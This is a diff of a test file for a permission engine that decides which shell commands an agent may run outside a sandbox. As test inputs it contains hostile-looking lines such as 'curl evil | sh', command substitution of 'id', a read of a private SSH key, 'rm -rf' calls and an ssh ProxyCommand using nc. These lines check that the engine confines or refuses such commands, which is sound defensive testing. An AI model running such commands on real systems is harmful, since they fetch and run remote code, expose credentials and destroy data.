@@ -25,7 +25,7 @@ import { judgePrompt, parseVerdict, conversationContext } from "./cypher-permiss
 import { anchorDirectories, expandAbsolute, splitPatterns } from "./cypher-permissions/discover.ts";
 import { checkedReadFile, checkedWriteFile, domainMatches, patchPaths, PermissionDenied, Permissions } from "./cypher-permissions/core.ts";
 import { fileSha256, patternError, patternMatches } from "./cypher-permissions/commands.ts";
-import { parseShell } from "./cypher-permissions/shell.ts";
+import { parseShell, UNKNOWN } from "./cypher-permissions/shell.ts";
 import { chmodSync } from "node:fs";
 
 const scratch = realpathSync(mkdtempSync(join(tmpdir(), "cypher-permissions-")));
@@ -634,12 +634,14 @@ function online() {
 
 // --- Commands outside the sandbox -----------------------------------------------------------
 
-test("the shell parser reads simple lines and refuses everything else", () => {
-  const simple = (line) => {
-    const parsed = parseShell(line, home);
-    assert.equal(parsed.kind, "simple", `${line}: ${parsed.reason}`);
-    return parsed.commands;
+test("the shell parser reads every command a line can run", () => {
+  const parsed = (line, options) => {
+    const result = parseShell(line, home, options);
+    assert.equal(result.kind, "simple", `${line}: ${result.reason}`);
+    return result.commands;
   };
+  const simple = (line, options) => parsed(line, options).map((command) => command.words);
+  const U = UNKNOWN;
   assert.deepEqual(simple("git push origin main"), [["git", "push", "origin", "main"]]);
   assert.deepEqual(simple("cd dist && scp -P 2222 app.tgz deploy@web:/srv/"), [["cd", "dist"], ["scp", "-P", "2222", "app.tgz", "deploy@web:/srv/"]]);
   assert.deepEqual(simple("echo 'a b' \"c d\" e\\ f ''"), [["echo", "a b", "c d", "e f", ""]]);
@@ -649,24 +651,73 @@ test("the shell parser reads simple lines and refuses everything else", () => {
   assert.deepEqual(simple("ls ~ ~/x"), [["ls", home, `${home}/x`]]);
   assert.deepEqual(simple("git log HEAD~1 # recent"), [["git", "log", "HEAD~1"]]);
   assert.deepEqual(simple('git commit -m "say \\"hi\\""'), [["git", "commit", "-m", 'say "hi"']]);
+  assert.deepEqual(simple('echo "a\\nb \\$x"'), [["echo", "a\\nb $x"]], "in double quotes a backslash escapes only $ ` \" \\");
+
+  // Words known only when the line runs.
+  assert.deepEqual(simple('echo $HOME "$x" ${y} $1 ls *.ts {a,b} ~root'), [["echo", U, U, U, U, "ls", U, U, U]]);
+  assert.deepEqual(simple("[ -f x ] && test -d y"), [["[", "-f", "x", "]"], ["test", "-d", "y"]]);
+  // Substitutions: their commands are read too, before the one they feed.
+  assert.deepEqual(simple("git push origin $(git branch --show-current)"), [["git", "branch", "--show-current"], ["git", "push", "origin", U]]);
+  assert.deepEqual(simple('kill `pgrep -f "my app"`'), [["pgrep", "-f", "my app"], ["kill", U]]);
+  assert.deepEqual(simple('echo "$(ls "a b" | wc -l) files"'), [["ls", "a b"], ["wc", "-l"], ["echo", U]]);
+  // Compound commands: each command in them may run.
+  assert.deepEqual(simple("for h in web db; do ssh $h uptime; done"), [["ssh", U, "uptime"]]);
+  assert.deepEqual(simple("for f in $(ls); do echo $f; done"), [["ls"], ["echo", U]]);
+  assert.deepEqual(simple("if git diff --quiet; then echo clean; elif true; then :; else git stash; fi"), [["git", "diff", "--quiet"], ["echo", "clean"], ["true"], [":"], ["git", "stash"]]);
+  assert.deepEqual(simple("while ! curl -s localhost:8080; do sleep 1; done"), [["curl", "-s", "localhost:8080"], ["sleep", "1"]]);
+  assert.deepEqual(simple('[[ -n "$(git status -s)" && $a < $b ]] || exit 0'), [["git", "status", "-s"], ["exit", "0"]]);
+  assert.deepEqual(simple("make |& tee log"), [["make"], ["tee", "log"]]);
+  // Redirections: the files they open.
+  const cat = parsed("cat < in.txt > out.txt 2>>err.log; echo hi >| x");
+  assert.deepEqual(cat.map((command) => [command.words, command.reads, command.writes]), [
+    [["cat"], ["in.txt"], ["out.txt", "err.log"]],
+    [["echo", "hi"], [], ["x"]],
+  ]);
+  assert.deepEqual(parsed("> empty.txt")[0].writes, ["empty.txt"], "a bare redirection still writes");
+  assert.deepEqual(parsed("cmd 3>&1 1>&2 2>&3 &>/dev/null <&-")[0], { words: ["cmd"], reads: [], writes: [], scoped: false, loop: false });
+  // Heredocs and here-strings: input, not commands.
+  assert.deepEqual(simple("ssh web 'bash -s' <<'EOF'\nrm -rf /tmp/x\n$(id)\nEOF\ngit status"), [["ssh", "web", "bash -s"], ["git", "status"]]);
+  assert.deepEqual(simple("cat <<-END | wc -l\n\tline $x\n\tEND"), [["cat"], ["wc", "-l"]]);
+  assert.deepEqual(simple('grep -c x <<< "$(git log)"'), [["git", "log"], ["grep", "-c", "x"]]);
+  // Scope: a `cd` there may not run, or not move the line's shell.
+  const scoped = (line) => parsed(line).map((command) => command.scoped);
+  assert.deepEqual(scoped("cd a; b"), [false, false]);
+  assert.deepEqual(scoped("cd a && b"), [false, true]);
+  assert.deepEqual(scoped("x || cd a; b"), [false, true, false]);
+  assert.deepEqual(scoped("cd a | b"), [true, true]);
+  assert.deepEqual(scoped("if x; then cd a; fi; b"), [true, true, false]);
+  assert.deepEqual(scoped("echo $(cd a; pwd)"), [true, true, false]);
+  assert.deepEqual(parsed("for x in a; do cd $x; done; b").map((command) => command.loop), [true, false]);
+  // Assignments stand alone only when allowed.
+  const local = { assignable: (name) => name === "out" };
+  assert.deepEqual(simple("out=$(git rev-parse HEAD); git push origin $out", local), [["git", "rev-parse", "HEAD"], ["git", "push", "origin", U]]);
+  assert.equal(parseShell("PATH=/tmp/x; git push", home, local).kind, "opaque");
+  assert.equal(parseShell("out=1 git push", home, local).kind, "opaque", "an assignment in front of a command sets its environment");
+
   for (const line of [
-    "echo $HOME",
-    "echo $(id)",
-    "echo `id`",
-    'echo "$x"',
-    'echo "a\\nb"',
-    "cat x > out",
-    "cat < in",
-    "ls *.ts",
-    "echo {a,b}",
+    "echo $((1 + 2))",
+    "echo ${x:-$(id)}",
+    "diff <(ls a) <(ls b)",
     "(cd x; ls)",
+    "{ ls; }",
     "sleep 1 &",
     "FOO=1 git push",
-    "for x in a b; do echo x; done",
-    "if true; then ls; fi",
-    "ls ~root",
-    "make |& tee log",
+    "X=1",
+    "case $x in a) ls;; esac",
+    "f() { ls; }",
+    "function f { ls; }",
+    "echo $'a\\nb'",
     "echo 'open",
+    'echo "open',
+    "echo $(id",
+    "cat > $out",
+    "cat <<EOF\n$(id)\nEOF",
+    "cat <<EOF\nno end",
+    "if true; then ls",
+    "done",
+    "for 1 in a; do ls; done",
+    "ls >",
+    "x=$(cat <<EOF\n)\nEOF\n)",
   ]) {
     assert.equal(parseShell(line, home).kind, "opaque", line);
   }
@@ -726,7 +777,21 @@ test("which commands run outside the sandbox", () => {
   assert.equal(kind("git status"), "outside");
   assert.equal(kind("cd src && git status -s"), "outside", "cd needs no leave");
   assert.equal(kind("git status && rm -rf build"), "sandbox", "every command must be allowed");
-  assert.equal(kind("git status $(id)"), "sandbox", "an opaque line matches no rule");
+  assert.equal(kind("git status $(id)"), "sandbox", "commands in a substitution need rules too");
+  assert.equal(kind("git status $(git rev-parse HEAD) | tail -1"), "sandbox", "tail has no rule");
+  assert.equal(kind("for b in main dev; do git status $b; done"), "outside", "each command in a loop");
+  assert.equal(kind("git status $(git status --short)"), "outside", "and in a substitution");
+  assert.equal(kind("git status (x)"), "sandbox", "an opaque line matches no rule");
+  assert.equal(kind("git push $flags"), "sandbox", "a word known only when it runs could be what a deny rule names");
+  assert.equal(kind("git pull $x"), "sandbox", "and what an ask rule names");
+  assert.equal(kind("$git status"), "sandbox", "a program known only when it runs matches nothing");
+  assert.equal(kind("git status > status.txt 2>&1"), "outside", "writes where the sandbox may");
+  assert.equal(kind("git status > ~/status.txt"), "sandbox", "not outside the workspace");
+  assert.equal(kind("git status > .git/config"), "sandbox", "nor a protected file");
+  assert.equal(kind("git status < ~/.ssh/id_ed25519"), "sandbox", "nor read a sensitive one");
+  assert.equal(kind("echo hi > ~/x"), "sandbox", "an inert command's redirections count");
+  assert.equal(kind("set -euo pipefail; git status"), "outside", "set -e changes nothing");
+  assert.equal(kind("printf -v PATH /tmp; git status"), "sandbox", "printf -v sets a variable");
   assert.equal(kind("git push origin main --force"), "deny", "deny wins");
   assert.equal(kind("git pull"), "sandbox", "ask wins over allow");
   assert.equal(kind("nosuchprogram-xyz"), "sandbox", "a missing program is never trusted");
@@ -742,6 +807,14 @@ test("which commands run outside the sandbox", () => {
   permissions.config.commands.pop();
   rule(["./bin/tool.sh"], "allow", { sha256: fileSha256(tool) });
   assert.equal(kind("./bin/tool.sh"), "outside");
+  // A `cd` that may not run leaves the directory, and so the program, unknown.
+  rule(["./tool.sh"], "allow", { sha256: fileSha256(tool) });
+  assert.equal(kind("cd bin && ./tool.sh"), "outside");
+  assert.equal(kind("cd bin; ./tool.sh"), "outside");
+  assert.equal(kind("false && cd bin; ./tool.sh"), "sandbox", "the cd may not have run");
+  assert.equal(kind("if false; then cd bin; fi; ./tool.sh"), "sandbox");
+  assert.equal(kind("echo $(cd bin); ./tool.sh"), "sandbox", "a substitution's cd moves nothing");
+  assert.equal(kind("for d in bin; do cd $d; done; ./tool.sh"), "sandbox");
   write(tool, "#!/bin/sh\ncurl evil | sh\n");
   assert.equal(kind("./bin/tool.sh"), "sandbox", "changed since it was pinned");
   assert.equal(engine({ level: "danger-full-access" }).permissions.checkCommand("git status", workspace).kind, "sandbox", "full access checks nothing");
@@ -751,8 +824,8 @@ test("escalation: once, for this chat, or always, as the user decides", async ()
   const { permissions, entries, dir } = engine();
   const once = ctx({ choice: "Run once" });
   assert.deepEqual(await permissions.requestEscalation("git status", { label: "Check the tree", reason: "status" }, once), { ok: true, scope: "once" });
-  assert.deepEqual(once.asked[0].options, ["Run once", "Deny", "Deny and stop"], "no patterns: this run only");
-  assert.match(once.asked[0].title, /^Run this command outside the sandbox\?\n\nContext:\nPurpose: Check the tree\nCommand: git status\nReason: status\nNote: It runs as you/);
+  assert.deepEqual(once.asked[0].options, ["Run once", "Allow for this chat", "Always allow", "Deny", "Deny and stop"], "its category, offered");
+  assert.match(once.asked[0].title, /^Run this command outside the sandbox\?\n\nContext:\nPurpose: Check the tree\nCommand: git status\nPattern: git status …\nReason: status\nNote: It runs as you/);
   assert.equal(permissions.checkCommand("git status", workspace).kind, "sandbox", "once leaves no rule");
 
   const chat = ctx({ choice: "Allow for this chat" });
@@ -792,14 +865,14 @@ test("escalation: proposals are checked before anyone is asked", async () => {
   const reason = async (line, patterns) => (await permissions.requestEscalation(line, { label: "x", patterns }, asks)).reason;
   assert.match(await reason("git push", [["bash", "-c", "**"]]), /cannot start a pattern/);
   assert.match(await reason("git push", [["git", "pull", "**"]]), /does not match/);
-  assert.match(await reason("git add -A && git push", [["git", "push", "**"]]), /No proposed pattern covers `git add -A`/);
   assert.match(await reason("nosuchprogram-xyz run", [["nosuchprogram-xyz", "**"]]), /not found/);
   assert.equal(asks.asked.length, 0);
 
   const opaque = ctx({ choice: "Run once" });
-  await permissions.requestEscalation("for h in a b; do ssh $h uptime; done", { label: "Uptime", patterns: [["ssh", "**"]] }, opaque);
+  const ran = await permissions.requestEscalation("ssh web uptime &", { label: "Uptime", patterns: [["ssh", "**"]] }, opaque);
   assert.deepEqual(opaque.asked[0].options, ["Run once", "Deny", "Deny and stop"], "an opaque line runs once at most");
-  assert.match(opaque.asked[0].title, /Note: It uses .+, which rules can't check/);
+  assert.match(opaque.asked[0].title, /Note: It uses a background job, which rules can't check, so it can only run once as written\./);
+  assert.deepEqual(ran, { ok: true, scope: "once", onceOnly: "it uses a background job, which rules can't check" }, "and says why");
 
   const tool = join(workspace, "bin", "deploy.sh");
   write(tool, "#!/bin/sh\necho deploy\n");
@@ -819,6 +892,77 @@ test("escalation: proposals are checked before anyone is asked", async () => {
   const off = engine();
   off.permissions.config.approval.escalate = "deny";
   assert.match((await off.permissions.requestEscalation("git status", { label: "x" }, ctx({ choice: "Run once" }))).reason, /always deny/);
+});
+
+test("escalation: each command's category, for this chat", async () => {
+  const offered = async (line, patterns) => {
+    const { permissions } = engine();
+    const asked = ctx({ choice: "Deny" });
+    await permissions.requestEscalation(line, { label: "x", patterns }, asked);
+    const title = asked.asked[0].title;
+    return {
+      patterns: [...title.matchAll(/^Pattern: (.*)$/gm)].map((match) => match[1]),
+      note: /^Note: (.*can only run once as written\.)$/m.exec(title)?.[1],
+    };
+  };
+  assert.deepEqual((await offered("ssh deploy@web 'df -h'")).patterns, ["ssh deploy@web …"]);
+  assert.deepEqual((await offered("ssh -p 2222 -i ~/.ssh/deploy deploy@web uptime")).patterns, [`ssh -p 2222 -i ${home}/.ssh/deploy deploy@web …`]);
+  assert.deepEqual((await offered("git add -A && git commit -m 'Ship it' && git push")).patterns, ["git add …", "git commit …", "git push …"]);
+  assert.deepEqual((await offered("git -C ../other push origin main")).patterns, ["git -C ../other push …"]);
+  assert.deepEqual((await offered("git push origin $(git branch --show-current)")).patterns, ["git branch …", "git push …"]);
+  assert.deepEqual((await offered("for h in web db; do git fetch $h; done")).patterns, ["git fetch …"]);
+  assert.deepEqual((await offered("xcrun simctl boot 'iPhone 17' && open -a Simulator")).patterns, ["xcrun simctl …", "open -a Simulator"]);
+  assert.deepEqual((await offered("npm run build && npm publish")).patterns, ["npm run build …", "npm publish …"]);
+  assert.deepEqual((await offered("lsof -i :8080")).patterns, ["lsof …"]);
+  assert.deepEqual((await offered("rm -rf ~/Library/Caches/app")).patterns, [`rm -rf ${home}/Library/Caches/app`], "rm only as written");
+  assert.deepEqual((await offered("ssh deploy@web uptime", [["ssh", "deploy@*", "**"]])).patterns, ["ssh deploy@* …"], "the agent's proposal covers it");
+  assert.deepEqual((await offered("git status > status.txt; git push")).patterns, ["git status …", "git push …"]);
+
+  for (const [line, why] of [
+    ["python3 deploy.py", "`python3` can run any command, so no rule may name it"],
+    ["xcrun python3 x.py", "`python3` can run any command, so no rule may name it"],
+    ["npm exec -y cowsay", "`npm exec` is not followed by what it runs"],
+    ["rm -rf $dir", "`rm` is given words known only when it runs"],
+    ["$tool --version", "A program in it is known only when it runs"],
+    ["ssh -o ProxyCommand='nc %h %p' web uptime", "Ssh is given an option that can run a command on this computer"],
+    ["ssh web -oProxyCommand=x uptime", "Ssh is given an option that can run a command on this computer"],
+    ["git log > ~/log.txt", `It writes ~/log.txt, which commands in the sandbox can't`],
+    ["nosuchprogram-xyz run", "`nosuchprogram-xyz` was not found"],
+  ]) {
+    const { patterns, note } = await offered(line);
+    assert.deepEqual(patterns, [], line);
+    assert.equal(note, `${why}, so it can only run once as written.`, line);
+  }
+
+  // Allowed for the chat: similar commands run outside without asking.
+  const { permissions } = engine();
+  await permissions.requestEscalation("ssh deploy@web uptime && git push origin main", { label: "Deploy" }, ctx({ choice: "Allow for this chat" }));
+  const kind = (line) => permissions.checkCommand(line, workspace).kind;
+  assert.equal(kind("ssh deploy@web 'systemctl restart app'"), "outside");
+  assert.equal(kind("for i in 1 2 3; do ssh deploy@web uptime; sleep 5; done"), "outside");
+  assert.equal(kind("git push --tags"), "outside");
+  assert.equal(kind("ssh deploy@db uptime"), "sandbox", "another host");
+  assert.equal(kind("ssh -o ProxyCommand=x deploy@web uptime"), "sandbox");
+  assert.equal(kind("ssh deploy@web -o ProxyCommand=x uptime"), "sandbox", "ssh reads options after the host too");
+
+  // A word known only when it runs could be what a deny or ask rule names.
+  const held = engine().permissions;
+  held.config.commands.push({ match: ["git", "push", "**", "--force", "**"], decision: "deny" }, { match: ["kubectl", "delete", "**"], decision: "ask" });
+  for (const [line, why] of [
+    ["git push origin $branch", "It could turn out to be `git push … --force …`, which is set to never run"],
+    ["kubectl $verb pod/x", "`kubectl delete …` is set to always ask"],
+  ]) {
+    const asked = ctx({ choice: "Deny" });
+    await held.requestEscalation(line, { label: "x" }, asked);
+    assert.deepEqual(asked.asked[0].options, ["Run once", "Deny", "Deny and stop"], line);
+    assert.match(asked.asked[0].title, new RegExp(`\\nNote: ${why.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}, so it can only run once as written\\.`), line);
+  }
+  assert.match((await held.requestEscalation("git push --force", { label: "x" }, ctx({ choice: "Run once" }))).reason, /never run/, "a deny that matches refuses");
+
+  // A command already allowed needs no pattern.
+  const both = ctx({ choice: "Deny" });
+  await permissions.requestEscalation("git push && ssh deploy@db uptime", { label: "x" }, both);
+  assert.deepEqual([...both.asked[0].title.matchAll(/^Pattern: (.*)$/gm)].map((match) => match[1]), ["ssh deploy@db …"]);
 });
 
 test("~/.ssh: config, known hosts and public keys are readable; private keys are not", async () => {
